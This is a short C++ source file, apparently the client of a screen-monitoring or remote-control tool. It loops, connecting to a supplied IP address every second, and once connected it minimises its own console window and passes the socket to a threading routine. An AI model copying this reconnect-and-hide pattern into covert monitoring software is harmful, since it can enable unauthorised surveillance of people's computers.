#include "Client.h"
#include <iostream>

int res = 0;                                 

double monitor_capture::resol_K = 0;
void Start_ClientModule(const char* ip)
{
    while (true)
    {
        std::cout << " no connect" << std::endl;

        SocketData sData = Init_Socket(ip);

        res = connect(sData.Socket_Jr, (SOCKADDR*)&sData.SocketAddr, sizeof(sData.SocketAddr));
        if (res != FAILED_SOCKET)
        {
            std::cout << "connect" << std::endl;
            ShowWindow(GetConsoleWindow(), SW_MINIMIZE);
            MultiThread(sData.Socket_Jr);
        }
        Sleep(1000);
    }

}




